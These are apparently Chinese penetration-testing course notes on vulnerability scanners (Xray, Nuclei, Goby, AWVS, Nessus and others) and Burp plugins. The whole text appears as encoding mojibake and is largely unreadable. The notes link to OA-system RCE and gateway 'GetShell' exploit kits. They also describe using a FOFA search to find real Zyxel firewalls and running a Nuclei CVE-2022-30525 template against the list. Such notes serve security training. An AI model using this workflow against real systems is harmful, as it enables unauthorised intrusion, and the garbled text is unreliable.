<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€ç½‘ç«™æºç é‡‡ç”¨è‡ªå·±å¼€å‘æ­å»º</span><br><span class="line">2ã€ç½‘ç«™æºç é‡‡ç”¨å¼€æºCMSæ­å»º</span><br><span class="line"></span><br><span class="line">å¸¸è§„æ¼æ´ -è‡ªå·±å¼€å‘æ­å»º</span><br><span class="line">å¸¸è§„æ¼æ´ - å¼€æºCMS å›¢é˜Ÿå¯ä»¥åšè¿™ä¸ªäº‹æƒ… ä¸€èˆ¬ç”¨å·¥å…·ç›´æ¥æ‰¾åˆ°æ¼æ´ä¸å¤ªç°å®(å…¶ä»–éæºç æ¼é™¤å¤–)</span><br><span class="line"></span><br><span class="line">å†·é—¨ å°ä¼— å›½å†…çš„CMSæºç  ç”¨ AWVSä¸é€‚åˆ</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Burp Suite,æ˜¯ç”¨äºæ”»å‡»webåº”ç”¨ç¨‹åºçš„é›†æˆå¹³å°ï¼ŒåŒ…å«äº†è®¸å¤šå·¥å…·ã€‚Burp Suiteä¸ºè¿™äº›å·¥å…·</span><br><span class="line">è®¾è®¡äº†è®¸å¤šæ¥å£ï¼Œä»¥åŠ å¿«æ”»å‡»åº”ç”¨ç¨‹åºçš„è¿‡ç¨‹ã€‚æ‰€æœ‰å·¥å…·éƒ½å…±äº«ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶èƒ½å¤„ç†å¯¹åº”</span><br><span class="line">çš„HTTPæ¶ˆæ¯ã€æŒä¹…æ€§ã€è®¤è¯ã€ä»£ç†ã€æ—¥å¿—ã€è­¦æŠ¥ã€‚</span><br><span class="line"></span><br><span class="line">ç”¨åˆ°æœ€å¤šçš„å·¥å…·æ„Ÿè§‰æ˜¯ï¼ŒWebæ‰‹å¿…å¤‡</span><br></pre></td></tr></table></figure>

<blockquote>
<p>pocassistæ˜¯ä¸€ä¸ªGolangç¼–å†™çš„å…¨æ–°å¼€æºæ¼æ´æµ‹iè¯•æ¡†æ¶ã€‚å®ç°å¯¹pocçš„åœ¨çº¿ç¼–è¾‘ã€ç®¡ç†ã€æµ‹<br>è¯•ã€‚å¦‚æœä½ ä¸æƒ³æ’¸ä»£ç ï¼Œåˆæƒ³å®ç°å³0cçš„é€»è¾‘ï¼Œåˆæƒ³åœ¨çº¿å¯¹é¶æœºå¿«é€Ÿæµ‹è¯•ï¼Œé‚£å°±ä½¿ç”¨<br>pocassistå§ã€‚å®Œå…¨å…¼å®¹xray,ä½†åˆä¸ä»…ä»…æ˜¯xTayã€‚é™¤äº†æ”¯æŒå®šä¹‰ç›®å½•çº§æ¼æ´poc,è¿˜æ”¯æŒæœ<br>åŠ¡å™¨çº§æ¼æ´ã€å‚æ•°çº§æ¼æ´ã€Uçº§æ¼æ´ä»¥åŠå¯¹é¡µé¢å†…å®¹æ£€æµ‹ï¼Œå¦‚æœä»¥ä¸Šè¿˜ä¸æ»¡è¶³ä½ çš„éœ€æ±‚ï¼Œ<br>è¿˜æ”¯æŒåŠ è½½è‡ªå®šä¹‰è„šæœ¬ã€‚</p>
</blockquote>
<blockquote>
<p>afrogæ˜¯ä¸€æ¬¾æ€§èƒ½å“è¶Šã€‚å¿«é€Ÿç¨³å®šã€PoCå¯å®šåˆ¶çš„æ¼æ´æ‰«çŒ«ï¼ˆæŒ–æ´ï¼‰å·¥å…·ï¼ŒPoCæ¶‰åŠ<br>CVEã€CNVDã€é»˜è®¤å£ä»¤ã€ä¿¡æ¯æ³„éœ²ã€æŒ‡çº¹è¯†åˆ«ã€æœªæˆæƒè®¿é—®ã€ä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œ<br>ç­‰å¤šç§æ¼æ´ç±»å‹ï¼Œå¸®åŠ©ç½‘ç»œå®‰å…¨ä»ä¸šè€…å¿«é€ŸéªŒè¯å¹¶åŠæ—¶ä¿®å¤æ¼æ´ã€‚</p>
</blockquote>
<blockquote>
<p>Xrayæ˜¯ä»é•¿äº­æ´é‰´æ ¸å¿ƒå¼•æ“ä¸­æå–å‡ºçš„ç¤¾åŒºç‰ˆæ¼æ´æ‰«æç¥é†’ï¼Œæ”¯æŒä¸»åŠ¨ã€æŠ«åŠ¨å¤šç§æ‰«ææ–¹<br>å¼ï¼Œè‡ªå¤‡è¨€æ‰“å¹³å°ã€å¯ä»¥çµæ´»å®šä¹‰POC,åŠŸèƒ½ä¸°å¯Œï¼Œè°ƒç”¨ç®€å•ï¼Œæ”¯æŒWindows &#x2F;macOs<br>å‡ inuXå¤šç§æ“ä½œç³»ç»Ÿï¼Œå¯ä»¥æ»¡è¶³å¹¿å¤§å®‰å…¨ä»ä¸šè€…çš„è‡ªåŠ¨åŒ–Wbæ¼æ´æ·±æµ‹éœ€æ±‚ã€‚</p>
</blockquote>
<blockquote>
<p>Gobyæ˜¯ä¸€æ¬¾æ–°çš„ç½‘ç»œå®‰å…¨æµ‹è¯•å·¥å…·ï¼Œç”±èµµæ­¦Zwell(Pangolinã€JSkyã€FOFAä½œè€…)æ‰“é€ ï¼Œ<br>å®ƒèƒ½å¤Ÿé’ˆå¯¹ä¸€ä¸ªç›®æ ‡ä¼ä¸šæ¢³ç†æœ€å…¨çš„æ”»å‡»é¢ä¿¡æ¯ï¼ŒåŒæ—¶èƒ½è¿›è¡Œé«˜æ•ˆã€å®æˆ˜åŒ–æ¼æ´æ‰«æï¼Œå¹¶<br>å¿«é€Ÿçš„ä»ä¸€ä¸ªéªŒè¯å…¥å£ç‚¹ï¼Œåˆ‡æ¢åˆ°æ¨ªå‘ã€‚èƒ½é€šè¿‡æ™ºèƒ½è‡ªåŠ¨åŒ–æ–¹å¼ï¼Œå¸®åŠ©å®‰å…¨å…¥é—¨è€…å°±æ‚‰é¶<br>åœºæ”»é˜²ï¼Œå¸®åŠ©æ”»é˜²æœåŠ¡è€…ã€æ¸—é€äººå‘˜æ›´å¿«çš„æ‹¿ä¸‹ç›®æ ‡</p>
</blockquote>
<blockquote>
<p>Vulmapæ˜¯ä¸€æ¬¾webæ¼æ´æ‰«æå’ŒéªŒè¯å·¥å…·ï¼Œå¯å¯¹webappsè¿›è¡Œæ¼æ´æ‰«æï¼Œå¹¶ä¸”å…·å¤‡æ¼æ´åˆ©ç”¨<br>åŠŸèƒ½ï¼Œç›®å‰æ”¯sæŒçš„webappsåŒ…æ‹¬activemq,flink,shiro,sol,struts2,tomcat,unomi,drupal,<br>elasticsearch,fastison,jenkins,nexus,weblogic,jboss,spring,thinkphp</p>
</blockquote>
<p>çœŸå°±å·®ä¸å¤šæ˜¯ï¼Œå·¥å…·ä½¿ç”¨å¤§æˆ˜ï¼</p>
<h3 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-42"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-42" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h3><p>æŸAPP-Webæ‰«æ-å¸¸è§„&amp;è”åŠ¨-Burp&amp;Awvs&amp;Xray<br>Vulfocus-æ¡†æ¶æ‰«æ-ç‰¹å®š-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist<br>æŸèµ„äº§ç‰¹å¾-è”åŠ¨æ‰«æ-ç»¼åˆ&amp;è°ƒç”¨-Goby&amp;Awvs&amp;Xray&amp;Vulmap</p>
<h4 id="é¡¹ç›®èµ„æºï¼š"><a href="#é¡¹ç›®èµ„æºï¼š" class="headerlink" title="é¡¹ç›®èµ„æºï¼š"></a>é¡¹ç›®èµ„æºï¼š</h4><p><a href="https://www.ddosi.org/awvs14-6-log4j-rce/">https://www.ddosi.org/awvs14-6-log4j-rce/</a><br><a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br><a href="https://github.com/zan8in/afrog/releases">https://github.com/zan8in/afrog/releases</a><br><a href="https://github.com/zhzyker/vulmap/releases">https://github.com/zhzyker/vulmap/releases</a><br><a href="https://github.com/jweny/pocassist/releases">https://github.com/jweny/pocassist/releases</a><br><a href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a></p>
<h4 id="å…¶ä»–ç‰¹æ‰«ï¼š"><a href="#å…¶ä»–ç‰¹æ‰«ï¼š" class="headerlink" title="å…¶ä»–ç‰¹æ‰«ï¼š"></a>å…¶ä»–ç‰¹æ‰«ï¼š</h4><p>1ã€GUI TOOLS V6.1byå®‰å…¨åœˆå°ç‹å­-bugfixed<br>2ã€CMSæ¼æ´æ‰«æå™¨åç§°æ”¯æŒçš„CMSå¹³å°<br>Droopescan<br>WordPress,Joomla,Drupal,Moodle,SilverStripe<br>CMSmap WordPress,Joomla,Drupal,Moodle<br>CMSeeK WordPress,Joomla,Drupal<br>WPXF WordPress<br>WPScan WordPress<br>WPSeku WordPress<br>WPForce WordPress<br>JoomScan Joomla<br>JoomlaVS Joomla<br>JScanner Joomla<br>Drupwn Drupal<br>Typo3Scan Typo3<br>è‡´è¿œOAç»¼åˆåˆ©ç”¨å·¥å…·<br><a href="https://github.com/Summer177/seeyon_exp">https://github.com/Summer177/seeyon_exp</a><br>seeyon exp<br>é€šè¾¾OAç»¼åˆåˆ©ç”¨å·¥å…·<br><a href="https://github.com/xinyu2428/TDOA">https://github.com/xinyu2428/TDOA</a> RCE TDOA RCE<br>è“å‡ŒOAæ¼æ´åˆ©ç”¨å·¥å…·å‰å°æ— æ¡ä»¶RCEæ–‡ä»¶å†™å…¥<br><a href="https://github.com/yuanhaiGreg/LandrayExploit">https://github.com/yuanhaiGreg/LandrayExploit</a> LandrayExploit<br>æ³›å¾®OAæ¼æ´ç»¼åˆåˆ©ç”¨è„šæœ¬htps:&#x2F;&#x2F;github.com&#x2F;z1 un&#x2F;weaver_exp weaver_.eXp<br>é”æ·ç½‘ç»œEGæ˜“é£å…³RCEæ‰¹é‡å®‰å…¨æ£€æµ‹<br><a href="https://github.com/Tas9er/EgGateWayGetShell">https://github.com/Tas9er/EgGateWayGetShell</a><br>EgGateWayGetShell<br>CMSmapé’ˆå¯¹æµè¡ŒcMSè¿›è¡Œå®‰å…¨æ‰«æçš„å·¥å…·htps:&#x2F;&#x2F;github.com&#x2F;Dionach&#x2F;CMSmap<br>CMSmap<br>ä½¿ç”¨Goå¼€å‘çš„WordPressæ¼æ´æ‰«æå·¥å…·<br><a href="https://github.com/blackbinn/wprecon">https://github.com/blackbinn/wprecon</a><br>wprecon<br>ä¸€ä¸ªRubyæ¡†æ¶ï¼Œæ—¨åœ¨å¸®åŠ©å¯¹VordPressç³»ç»Ÿè¿›è¡Œæ¸—é€æµ‹è¯•<br><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> wordpress-exploit-framework<br>WPScan WordPresså®‰å…¨æ‰«æå™¨<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a> wpscan<br>VPForce Wordpressæ”»å‡»å¥—ä»¶<a href="https://github.com/nO0">https://github.com/nO0</a> py&#x2F;WPForce<br>WPForce</p>
<p>æŸAPP-Webæ‰«æ-å¸¸è§„&amp;è”åŠ¨-Burp&amp;Awvs&amp;Xray<br>æ¡ˆä¾‹ï¼šé…åˆè”åŠ¨å¯¹æŸAPPè¿›è¡Œå®‰å…¨æ£€æŸ¥è¯„ä¼°<br>å¯¹æ¯”å·¥å…·ä¼˜ç¼ºç‚¹<br>-å¯¹æ¯”å·¥å…·ä½¿ç”¨æ–¹æ³•</p>
<p>Awvs:</p>
<p>ä»»åŠ¡æ·»åŠ &amp;æ•°æ®å¤´éƒ¨&amp;ä»£ç†æ¨¡å¼&amp;æ‰«ææ¨¡å¼ç­‰<br>example:<a href="http://demo.aisec.cn/">http://demo.aisec.cn/</a></p>
<p>Xray:</p>
<p>ä¸»åŠ¨æ‰«æ&amp;è¢«åŠ¨æ‰«æ&amp;POCèµ„æºç­‰<br>.\xray_windows_amd64.exe webscan â€“basic-craller <a href="http://xx/%E2%80%93html-output">http://xx/â€“html-output</a> tomcat.html<br>.\xray_windows_amd64.exe webscanâ€“listen 127.0.0.1:7777â€“html-output app.html<br>ä¸»åŠ¨æ‰«æçš„ç¼ºç‚¹:</p>
<p>URLå•ç‚¹æ‰«æ&amp;æ•°æ®åŒ…æ‰«æ<br>1ã€ç›¸äº’è”åŠ¨æ€§è§£å†³æ¼æ‰«<br>2ã€ç›¸äº’è”åŠ¨æ€§è§£å†³URLæœªæ¢é’ˆ<br>æ‰‹å·¥è§¦å‘URLæ•°æ®åŒ…&amp;æ‰«æå™¨çˆ¬è™«è§„åˆ™æ¢é’ˆ<br>Burp&amp;Xrayè”åŠ¨<br>1ã€Burpè®¾ç½®è½¬å‘ä»£ç†<br>2ã€Xrayè®¾ç½®è¢«åŠ¨æ‰«æ<br>AwWs&amp;Xrayè”åŠ¨<br>1ã€AWWSè®¾ç½®ä»£ç†æ‰«çŒ«<br>2ã€Xrayè®¾ç½®è¢«åŠ¨æ‰«æ<br>Awvs&amp;Burp&amp;Xrayè”åŠ¨<br>1ã€AwWSè®¾ç½®ä»£ç†æ‰«æ<br>2ã€Bupè®¾ç½®è½¬å‘ä»£ç†<br>3ã€Xrayè®¾ç½®è¢«åŠ¨æ‰«æ</p>
<p>Vulfocus-æ¡†æ¶æ‰«æ-ç‰¹å®š&amp;æ ¸å¿ƒ-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist<br>æ¡ˆä¾‹ï¼šé…åˆvulfocusè¿›è¡ŒæŸæœåŠ¡æˆ–ä¸­é—´ä»¶çš„å®‰å…¨æ£€æŸ¥è¯„ä¼°</p>
<p>æŸèµ„äº§ç‰¹å¾-è”åŠ¨æ‰«æ-ç»¼åˆ&amp;è°ƒç”¨-Goby&amp;AWVS&amp;Xray&amp;Vulmap<br>æ¡ˆä¾‹ï¼šé…åˆGoby&amp;Fofaæ’ä»¶è¿›è¡ŒæŸä¸­é—´ä»¶çš„å®‰å…¨æ£€æŸ¥è¯„ä¼°<br>1ã€ä¸‹è½½æ‹“å±•æ’ä»¶<br>2ã€è®¾ç½®é…ç½®æ’ä»¶</p>
<p>è¿™å‡ èŠ‚è¯¾ä¸»è¦è®²å·¥å…·çš„ä½¿ç”¨ç®€å•çœ‹ä¸€ä¸‹ ä¸»è¦æ˜¯å®è·µ</p>
<h1 id="ç¬¬73å¤©-æ¼æ´å‘ç°-æ“ä½œç³»ç»ŸæœåŠ¡ä¸­é—´ä»¶-Nuclei-Nessus-Nexpose-Goby"><a href="#ç¬¬73å¤©-æ¼æ´å‘ç°-æ“ä½œç³»ç»ŸæœåŠ¡ä¸­é—´ä»¶-Nuclei-Nessus-Nexpose-Goby" class="headerlink" title="ç¬¬73å¤© æ¼æ´å‘ç°-æ“ä½œç³»ç»ŸæœåŠ¡ä¸­é—´ä»¶&amp;Nuclei&amp;Nessus.&amp;Nexpose&amp;Goby"></a>ç¬¬73å¤© æ¼æ´å‘ç°-æ“ä½œç³»ç»ŸæœåŠ¡ä¸­é—´ä»¶&amp;Nuclei&amp;Nessus.&amp;Nexpose&amp;Goby</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-49"><a href="#çŸ¥è¯†ç‚¹ï¼š-49" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€Gobyç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>2.Nucleiç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>3ã€Nessusç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>4ã€Nexposeç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>5ã€æŒæ¡å·¥å…·å®‰è£…ä½¿ç”¨&amp;åŸç†&amp;è”åŠ¨&amp;é€‚ç”¨<br>å¸‚é¢ä¸Šæœ‰å¾ˆå¤šæ¼æ‰«ç³»ç»Ÿå·¥å…·è„šæœ¬ï¼Œè¯¾ç¨‹è®²åˆ°çš„åŸºæœ¬éƒ½æ˜¯ç›®å‰ä¸»æµæ¨èçš„ä¼˜ç§€é¡¹ç›®ï¼<br>å…·ä½“é¡¹ç›®ï¼šBurpsuite,AwWs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Nexpose,BP(HaE,ShiroScan.FastJsonScan,Log4j2Scan).</p>
<h4 id="ç« èŠ‚ç‚¹ï¼š-4"><a href="#ç« èŠ‚ç‚¹ï¼š-4" class="headerlink" title="ç« èŠ‚ç‚¹ï¼š"></a>ç« èŠ‚ç‚¹ï¼š</h4><p>1ã€æ¼æ´å‘ç°-Web&amp;æ¡†æ¶å±‚é¢<br>2ã€æ¼æ´å‘ç°-æœåŠ¡&amp;ä¸­é—´ä»¶å±‚é¢<br>2ã€æ¼æ´å‘ç°-APP&amp;å°ç¨‹åºå±‚é¢<br>3ã€æ¼æ´å‘ç°-PCæ“ä½œç³»ç»Ÿå±‚é¢</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-43"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-43" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>Nessus&amp;Nexposeiæ¼æ‰«æ“ä½œç³»ç»Ÿæ¼æ´<br>Goby&amp;Nucleiæ¼æ‰«ç³»ç»Ÿ&amp;æœåŠ¡&amp;ä¸­é—´ä»¶æ¼æ´<br>Nucleiæ¼æ‰«ç‰¹å®šèµ„äº§&amp;æ¨¡ç‰ˆå¯¼å…¥&amp;æœ€æ–°æ¼æ´<br>FofaMAP&amp;Nucleiæ¼æ‰«è‡ªåŠ¨åŒ–ç‰¹å®šé¡¹ç›®æ¼æ´</p>
<h4 id="é¡¹ç›®èµ„æºï¼š-1"><a href="#é¡¹ç›®èµ„æºï¼š-1" class="headerlink" title="é¡¹ç›®èµ„æºï¼š"></a>é¡¹ç›®èµ„æºï¼š</h4><p>Goby:<a href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a><br>Nuclei:<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a><br>Nessus:<a href="https://mp.weixin.qq.com/s/G-7Yu8sefH3Bm3GRtUo2EA">https://mp.weixin.qq.com/s/G-7Yu8sefH3Bm3GRtUo2EA</a><br>Nexpose:<a href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a><br>FofaMAP:<a href="https://github.com/asaotomo/FofaMap">https://github.com/asaotomo/FofaMap</a></p>
<h4 id="æ¡ˆä¾‹1-Nessus-Nexposeæ¼æ‰«æ“ä½œç³»ç»Ÿæ¼æ´"><a href="#æ¡ˆä¾‹1-Nessus-Nexposeæ¼æ‰«æ“ä½œç³»ç»Ÿæ¼æ´" class="headerlink" title="æ¡ˆä¾‹1-Nessus&amp;Nexposeæ¼æ‰«æ“ä½œç³»ç»Ÿæ¼æ´"></a>æ¡ˆä¾‹1-Nessus&amp;Nexposeæ¼æ‰«æ“ä½œç³»ç»Ÿæ¼æ´</h4><p>å®‰è£…ä½¿ç”¨</p>
<h4 id="æ¡ˆä¾‹2-Goby-Nucleæ¼æ‰«ç³»ç»Ÿ-æœåŠ¡-ä¸­é—´ä»¶æ¼æ´"><a href="#æ¡ˆä¾‹2-Goby-Nucleæ¼æ‰«ç³»ç»Ÿ-æœåŠ¡-ä¸­é—´ä»¶æ¼æ´" class="headerlink" title="æ¡ˆä¾‹2-Goby&amp;Nucleæ¼æ‰«ç³»ç»Ÿ&amp;æœåŠ¡&amp;ä¸­é—´ä»¶æ¼æ´"></a>æ¡ˆä¾‹2-Goby&amp;Nucleæ¼æ‰«ç³»ç»Ÿ&amp;æœåŠ¡&amp;ä¸­é—´ä»¶æ¼æ´</h4><p>gobyå›¾å½¢åŒ–ç•Œé¢<br>nuclei å¯ä»¥è‡ªå®šä¹‰æ£€æµ‹è„šæœ¬<br>Nuclei -u <a href="http://xxxxxxxx/">http://xxxxxxxx</a></p>
<h4 id="æ¡ˆä¾‹3-Nucleiæ¼æ‰«ç‰¹å®šèµ„äº§-æ¨¡ç‰ˆå¯¼å…¥-æœ€æ–°æ¼æ´"><a href="#æ¡ˆä¾‹3-Nucleiæ¼æ‰«ç‰¹å®šèµ„äº§-æ¨¡ç‰ˆå¯¼å…¥-æœ€æ–°æ¼æ´" class="headerlink" title="æ¡ˆä¾‹3-Nucleiæ¼æ‰«ç‰¹å®šèµ„äº§&amp;æ¨¡ç‰ˆå¯¼å…¥&amp;æœ€æ–°æ¼æ´"></a>æ¡ˆä¾‹3-Nucleiæ¼æ‰«ç‰¹å®šèµ„äº§&amp;æ¨¡ç‰ˆå¯¼å…¥&amp;æœ€æ–°æ¼æ´</h4><p>ä¾‹å­ï¼šCVE-2022-30525:ZyXlé˜²ç«å¢™è¿œç¨‹å‘½ä»¤æ³¨å…¥æ¼æ´<br>FofaViewer:title&#x3D;&#x3D;â€œUSG FLEX 50(USG20-VPN)â€<br>nuclei.exe -t Zyxel.yaml -I z.txt<br>Zyxel.yaml<br>id:CVE-2022-30525</p>
<h4 id="æ¡ˆä¾‹4-FofaMAPæˆ·-Nucleæ¼æ‰«è‡ªåŠ¨åŒ–ç‰¹å®šèµ„äº§æ¼æ´"><a href="#æ¡ˆä¾‹4-FofaMAPæˆ·-Nucleæ¼æ‰«è‡ªåŠ¨åŒ–ç‰¹å®šèµ„äº§æ¼æ´" class="headerlink" title="æ¡ˆä¾‹4-FofaMAPæˆ·&amp;Nucleæ¼æ‰«è‡ªåŠ¨åŒ–ç‰¹å®šèµ„äº§æ¼æ´"></a>æ¡ˆä¾‹4-FofaMAPæˆ·&amp;Nucleæ¼æ‰«è‡ªåŠ¨åŒ–ç‰¹å®šèµ„äº§æ¼æ´</h4><h1 id="ç¬¬74å¤©-æ¼æ´å‘ç°-Webæ¡†æ¶ä¸­é—´ä»¶æ’ä»¶-BurpSuite-æµè§ˆå™¨-è¢«åŠ¨-ä¸»åŠ¨æ¢é’ˆ"><a href="#ç¬¬74å¤©-æ¼æ´å‘ç°-Webæ¡†æ¶ä¸­é—´ä»¶æ’ä»¶-BurpSuite-æµè§ˆå™¨-è¢«åŠ¨-ä¸»åŠ¨æ¢é’ˆ" class="headerlink" title="ç¬¬74å¤© æ¼æ´å‘ç°-Webæ¡†æ¶ä¸­é—´ä»¶æ’ä»¶&amp;BurpSuite&amp;æµè§ˆå™¨&amp;è¢«åŠ¨&amp;ä¸»åŠ¨æ¢é’ˆ"></a>ç¬¬74å¤© æ¼æ´å‘ç°-Webæ¡†æ¶ä¸­é—´ä»¶æ’ä»¶&amp;BurpSuite&amp;æµè§ˆå™¨&amp;è¢«åŠ¨&amp;ä¸»åŠ¨æ¢é’ˆ</h1><p>æœ€è¿‘å‡ å¤©éƒ½æ˜¯æ¼”ç¤ºå·¥å…·å¦‚ä½•ä½¿ç”¨å¦‚ï¼š<a href="https://so.csdn.net/so/search?q=AWVS&spm=1001.2101.3001.7020">AWVS</a>ã€Nessusã€nexposeç­‰ç»¼åˆæ€§åˆ©ç”¨å·¥å…·ã€‚<br>Burpæ’ä»¶å’Œæ¼æ‰«å·¥å…·çš„åŒºåˆ«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç›®æ ‡ï¼š</span><br><span class="line">1ã€ç”¨å…¶ä»–çš„å·¥å…·é¡¹ç›®å»æ£€æµ‹æ¼æ´</span><br><span class="line"></span><br><span class="line">2ã€ç”¨BurpsuiteæŠ“åŒ…åå¸¦å…¥æ’ä»¶æ£€æµ‹</span><br><span class="line">æœ‰éƒ¨åˆ†ç›®æ ‡éœ€è¦ç‰¹å®šçš„æ•°æ®åŒ…è®¿é—®çš„</span><br><span class="line"></span><br><span class="line">1ã€ç™»å½•çŠ¶æ€å’Œæœªç™»å½•çŠ¶æ€</span><br><span class="line">2ã€ä¸åŒç›®æ ‡è®¿é—®çš„æ•°æ®åŒ…çš„ä¸åŒ</span><br></pre></td></tr></table></figure>

<h4 id="çŸ¥è¯†ç‚¹ï¼š-50"><a href="#çŸ¥è¯†ç‚¹ï¼š-50" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æµè§ˆå™¨æ’ä»¶&amp;BurpSuiteæ’ä»¶<br>2ã€Hack-Tools&amp;pentestkit&amp;fofa viewç­‰<br>3ã€Fiora&amp;Spring&amp;Fastison&amp;Shiro&amp;Log4ç­‰<br>å¸‚é¢ä¸Šæœ‰å¾ˆå¤šæ¼æ‰«ç³»ç»Ÿå·¥å…·èœ˜æœ¬ï¼Œè¯¾ç¨‹è®²åˆ°çš„åŸºæœ¬éƒ½æ˜¯ç›®å‰ä¸»æµæ¨èçš„ä¼˜ç§€é¡¹ç›®ï¼<br>å…·ä½“é¡¹ç›®ï¼šBurpsuite,Awvs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Nexpose,BP(HaE,ShiroScan.FastJsonScan,Log4j2Scan).</p>
<h4 id="ç« èŠ‚ç‚¹ï¼š-5"><a href="#ç« èŠ‚ç‚¹ï¼š-5" class="headerlink" title="ç« èŠ‚ç‚¹ï¼š"></a>ç« èŠ‚ç‚¹ï¼š</h4><p>1ã€æ¼æ´å‘ç°-Web&amp;æ¡†æ¶å±‚é¢<br>2ã€æ¼æ´å‘ç°æœåŠ¡&amp;ä¸­é—´ä»¶å±‚é¢<br>3ã€æ¼æ´å‘ç°-APP&amp;å°ç¨‹åºå±‚é¢<br>4ã€æ¼æ´å‘ç°PCæ“ä½œç³»ç»Ÿå±‚é¢</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-44"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-44" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>æµè§ˆå™¨æ’ä»¶-è¾…åŠ©&amp;èµ„äº§&amp;æ¼æ´åº“-Hack-Tools&amp;Fofa view&amp;Pentestkit<br>BurpSuiteæ’ä»¶-è¢«åŠ¨&amp;ç‰¹å®šæ‰«æ-Fiora&amp;Spring&amp;Fastison&amp;Shiro&amp;Log4j</p>
<p>æµè§ˆå™¨æ’ä»¶-è¾…åŠ©&amp;èµ„äº§&amp;æ¼æ´åº“-Hack.Tools&amp;Fofa view&amp;Pentestkit<br>èµ„äº§ï¼š<a href="https://github.com/fofapro/fofa_view">https://github.com/fofapro/fofa_view</a><br>ä¿¡æ¯æ”¶é›† éœ€è¦fofaä¸ºç™»å½•çŠ¶æ€</p>
<p>è¾…åŠ©ï¼š<a href="https://github.com/LasCc/Hack-Tools">https://github.com/LasCc/Hack-Tools</a><br>å·¥å…·ç®±åŒ…å«æœ‰ åå¼¹shellã€ç³»ç»Ÿå‘½ä»¤ã€æ–‡ä»¶åŒ…å«è¯­å¥ç­‰</p>
<p>æ¼æ´åº“ï¼š<a href="https://github.com/DenisPodgurskii/pentestkit">https://github.com/DenisPodgurskii/pentestkit</a><br>ä¿¡æ¯æ”¶é›†ã€æ¼æ´æ¢æµ‹ã€wafè¯†åˆ«</p>
<p>BurpSuiteæ’ä»¶-è¢«åŠ¨&amp;ç‰¹å®šæ‰«æ-Fiora&amp;Spring&amp;Fastjson&amp;Shiro&amp;Log4</p>
<p><a href="https://github.com/bit4woo/Fiora">https://github.com/bit4woo/Fiora</a><br>åŠŸèƒ½ï¼šè”åŠ¨nucleiè¿›è¡Œå•ä¸ªæˆ–å¤šä¸ªpocæµ‹è¯•</p>
<p><a href="https://github.com/metaStor/SpringScan">https://github.com/metaStor/SpringScan</a><br>SpringScan æ¼æ´æ£€æµ‹ Burpæ’ä»¶<br><a href="https://github.com/Maskhe/FastjsonScan">https://github.com/Maskhe/FastjsonScan</a></p>
<p><a href="https://github.com/bigsizeme/Log4j-check">https://github.com/bigsizeme/Log4j-check</a><br>è¢«åŠ¨lg4jæ‰«æ æ”¯æŒRC1ç»•è¿‡ log4J burpè¢«æ‰«æ’ä»¶ã€CVE-2021-44228ã€æ”¯æŒRC1ç»•è¿‡ã€æ”¯æŒjsonæ•°æ®ç±»å‹ã€æ”¯æŒdnslog.cnå’Œburpå†…ç½®DNSã€å¯é…åˆJNDIExploitç”Ÿæˆpayload</p>
<p><a href="https://github.com/projectdiscovery/nuclei-burp-plugin">https://github.com/projectdiscovery/nuclei-burp-plugin</a></p>
<p>è¿™èŠ‚ä¸»è¦è®²çš„å¤§éƒ¨åˆ†éƒ½æ˜¯å¯¹ç›¸å…³å·¥å…·çš„ä½¿ç”¨ã€‚</p>
